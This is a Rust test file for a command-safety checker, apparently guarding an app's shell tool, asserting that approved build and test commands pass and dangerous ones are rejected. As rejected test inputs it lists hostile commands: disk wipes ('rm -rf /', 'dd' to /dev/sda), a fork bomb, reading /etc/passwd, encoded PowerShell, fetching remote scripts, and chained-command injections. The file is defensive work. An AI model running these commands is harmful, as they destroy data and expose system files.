use shuji_app_lib::tool::check_command_safety;

#[test]
fn blocks_shell_control_composition() {
    for cmd in [
        "cargo test && del important.txt",
        "npm test; Remove-Item file",
        "cargo test | powershell -enc AAA",
        "npm run lint > C:\\Windows\\temp\\x",
        "cargo test $(whoami)",
    ] {
        assert!(
            check_command_safety(cmd).is_err(),
            "should reject shell composition: {cmd}"
        );
    }
}

#[test]
fn blocks_case_insensitive_and_aliases() {
    for cmd in [
        "SUDO rm -rf /",
        "PoWeRsHeLl -EncodedCommand AAA",
        "Invoke-WebRequest https://example.com/a.ps1",
        "iwr https://example.com/a.ps1",
        "curl https://example.com/a.ps1",
    ] {
        assert!(
            check_command_safety(cmd).is_err(),
            "should reject dangerous alias or casing: {cmd}"
        );
    }
}

#[test]
fn blocks_path_escapes() {
    for cmd in [
        "cargo test ../outside",
        "npm run lint C:\\Windows\\System32",
        "cargo test %WINDIR%",
        "cargo test $env:APPDATA",
        "cargo test \\\\server\\share",
    ] {
        assert!(
            check_command_safety(cmd).is_err(),
            "should reject path escape: {cmd}"
        );
    }
}

#[cfg(windows)]
#[test]
fn blocks_windows_destructive_commands() {
    for cmd in [
        "del /s /q src",
        "rd /s /q src",
        "erase important.txt",
        "Remove-Item -Recurse src",
        "Stop-Computer",
        "Restart-Computer",
        "reg add HKCU\\Software\\Bad",
        "reg delete HKCU\\Software\\Bad",
    ] {
        assert!(
            check_command_safety(cmd).is_err(),
            "should reject Windows destructive command: {cmd}"
        );
    }
}

#[cfg(not(windows))]
#[test]
fn blocks_unix_destructive_commands() {
    for cmd in [
        "rm -rf /",
        "rm -rf /*",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda",
        "cat /etc/passwd",
        "chmod -R 777 /",
        ":(){ :|:& };:",
    ] {
        assert!(
            check_command_safety(cmd).is_err(),
            "should reject Unix destructive command: {cmd}"
        );
    }
}

#[test]
fn allows_approved_project_commands() {
    for cmd in [
        "cargo test --lib",
        "cargo test --tests",
        "cargo clippy --all-targets",
        "cargo fmt --check",
        "cargo build",
        "npm test",
        "npm run lint",
        "npm run format:check",
        "npm run build",
        "python -m pytest -v",
        "py -m pytest tests",
        "ruff check .",
        "node --version",
        "npm --version",
    ] {
        assert!(
            check_command_safety(cmd).is_ok(),
            "should allow approved command: {cmd}"
        );
    }
}

#[test]
fn rejects_unapproved_custom_commands() {
    for cmd in ["git status", "python setup.py install", "node script.js"] {
        assert!(
            check_command_safety(cmd).is_err(),
            "should reject unapproved custom command: {cmd}"
        );
    }
}
